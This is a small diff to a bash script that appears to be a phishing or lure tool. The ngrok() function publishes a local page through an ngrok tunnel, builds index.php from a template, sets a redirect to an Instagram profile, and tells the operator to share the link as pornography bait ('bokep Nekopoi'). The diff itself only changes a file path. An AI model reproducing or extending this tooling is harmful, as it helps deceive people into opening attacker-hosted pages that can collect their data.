@@ -44,7 +44,7 @@ ngrok(){
     redirect_link="https://www.instagram.com/wong_biasa0723/"
     link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
     sed 's+forwarding_link+'$link'+g' template.php > index.php
-    sed 's+redirect_link+'$redirect_link'+g' js/_app.js > js/app.js
+    sed 's+redirect_link+'$redirect_link'+g' Mhw/_app.js > Mhw/app.js
 
     printf "\e[1;92m[\e[0m+\e[1;92m] Share bokep\033[31;1m Nekopoi\e[0m\e[1;92m link:\e[0m\e[1;77m %s\e[0m\n" $link
 
